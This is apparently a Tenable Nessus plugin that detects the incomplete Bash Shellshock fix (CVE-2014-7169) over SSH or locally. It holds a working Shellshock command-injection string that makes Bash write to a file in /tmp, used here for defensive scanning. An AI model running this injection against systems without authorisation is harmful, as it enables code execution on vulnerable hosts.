#TRUSTED 89976b9824fb866a1025b8b22df6988799e97f2893fec3c0b5477d313e937b53eee464535c6eacea38081796f11268eb6cd24e03ec91dfe8c12274e70b49edde3dd06e9bd882efe4fbf5b6eab7aa312c6942af31c1e3106d945815234f757f55e6a720d91407e3f6329c9b420ae406d438dfe5cf451d94eab866c07ee5ef4c6163853cadc0057ba9302e69ca9f7a8546937f069f05b28d8d4acede57e4af317c51347e4db6cfac677363aea597b4ceef15ccb11dad149058120d0b1a23af7086dfba61ffabec02bbcf86e6dc86f33e2653d4ee890a979bc74bf6f2c33249df7e28af094da768ac8f6564d9edfd04fd3c88329cd6cbbf29acc5e6b780b3e878b53245bbac42e7c622bfec9fc090bda61c7a38401f8d685963ecc41b85685cf9228d9b8ba0dd27440257f784b6fd9c896faf92a62b88da6642c3db0fcd126ab2fe4b5c39694bed744d4ef3c4884d3869b08a8350a466bfe21e58b2e75b9bd60b9f029dd888c75acdf960cc97262dfd3000041b637789663d7fb339f31a5f26e7bb6ff7468dd08877d63b2806f4b8ec9835f6fd131f9b25390eefa24e7537d94bb45900fd27a1779aa755be80a7464c55f01857aaeefacf8d373849e30ddd9a2702acf74699f731c8e39b632301c8acd2146819f08b40fc1dbdb702613a348a3b6bdfe65766b8cb1f4c94fcb6aff6fbc60b16a157f260af4d3a00da45b36ba89dfb
#TRUST-RSA-SHA256 971dc774efde7527318110383ac0e7474475337221754573e9f5c4607179b1d904efb2db71c58f6ba62652a3ee7deab1b97c05ee70aeb8b1703c13fbf72fbb8a670230a23ffde127d668a2eca0908517d774dfb8c0f5b03a4ea720261686566815afca0cd6f487d9f129cc4c303fe6b2f642cc848d32266b4418f1843b6342c6e347962e62f87d4366666357f22c8f4093f8047456440b7ed32461af0b8b69cc73dbadf7572328771c87fd23ec47745f70e4742ad347644e9acae1a511863f81f3847380343b91747b04f09d3705a576a376e9cc61821f6bf2112f25e8982c7eb44c02f9b98bc78dc0fab88ae80e761fad7e878968b0a0d84c099998538385a9e1576b199066a9223b2ac01cc9a6a3ca44dd103182b5f60d8448242b28e8df99e14b343f42d677510c1580f9f4c88c1e153a585d62f17951f7c94330139002e30cb1d25616b584170aef053213312eb9e6517737ff3e2bad7dead98de27aac013d719aa75ac0d2ed58c312aa467f016217bbcc6c2fd6feedd3bb6af193366d30572b195967ed266b2e93ea0606a980e38bce938a38ff2c68b9fe007dc4b9e86ee69d1e42b2ac1e280579afe82f3af75989a2febc493174b4835e27cb71e91276811da74c049e215888256ece1a2c2060b23450ad7d52917b220b097fae8526ac5df77ae5403355fbfefc6241bf73253016d079bb4c5ba716d87916147071ff46
#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(78385);
  script_version("1.23");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/11/27");

  script_cve_id("CVE-2014-7169");
  script_bugtraq_id(70137);
  script_xref(name:"CERT", value:"252743");
  script_xref(name:"IAVA", value:"2014-A-0142");
  script_xref(name:"EDB-ID", value:"34765");
  script_xref(name:"EDB-ID", value:"34766");
  script_xref(name:"EDB-ID", value:"34777");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/07/28");

  script_name(english:"Bash Incomplete Fix Remote Code Execution Vulnerability (Shellshock)");

  script_set_attribute(attribute:"synopsis", value:
"A system shell on the remote host is vulnerable to command injection.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of Bash that is vulnerable to
command injection via environment variable manipulation. Depending on
the configuration of the system, an attacker can remotely execute
arbitrary code.");
  # https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dacf7829");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate updates.");
  script_set_attribute(attribute:"agent", value:"unix");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2014-7169");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Pure-FTPd External Authentication Bash Environment Variable Code Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/10/13");

  script_set_attribute(attribute:"plugin_type", value:"local");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gnu:bash");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2014-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ssh_get_info.nasl");
  script_require_keys("HostLevelChecks/proto");
  script_require_ports("Services/ssh", 22);

  exit(0);
}

include('ssh_func.inc');
include('telnet_func.inc');
include('hostlevel_funcs.inc');
include('data_protection.inc');

enable_ssh_wrappers();

var proto = get_kb_item_or_exit('HostLevelChecks/proto');

var port = get_service(svc:"ssh", default:22, exit_on_fail:TRUE);
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

var info_t;

if (proto == 'local')
  info_t = INFO_LOCAL;
else if (proto == 'ssh')
{
  info_t = INFO_SSH;
  var ret = ssh_open_connection();
  if (!ret) audit(AUDIT_FN_FAIL, 'ssh_open_connection');
}
else
  exit(0, 'This plugin only attempts to run commands locally or via SSH, and neither is available against the remote host.');

  var AIX_Check = get_kb_item("Host/AIX/version");
  if (!isnull(AIX_Check) && AIX_Check =~ '^AIX-[0-5].')
  {
    if(info_t == INFO_SSH) ssh_close_connection();
    exit(0, "Commands are not supported on AIX 5.1 and below");
  }
else
  var command = "cd /tmp && X='() { (a)=>\' bash -c 'echo /usr/bin/id' && cat /tmp/echo && rm /tmp/echo";
  var output = info_send_cmd(cmd:command);

  if(info_t == INFO_SSH) ssh_close_connection();
  if (output !~ "uid=[0-9]+.*gid=[0-9]+.*") audit(AUDIT_HOST_NOT, "affected.");

var report =
  '\n' + 'Nessus was able to exploit a flaw in the patch for CVE-2014-7169' +
  '\n' + 'and write to a file on the target system.' +
  '\n' +
  '\n' + 'File contents :' +
  '\n' +
  '\n' + data_protection::sanitize_uid(output:output) +
  '\n' +
  '\n' + 'Note: Nessus has attempted to remove the file from the /tmp directory.\n';
security_report_v4(port:port,extra:report,severity:SECURITY_HOLE);

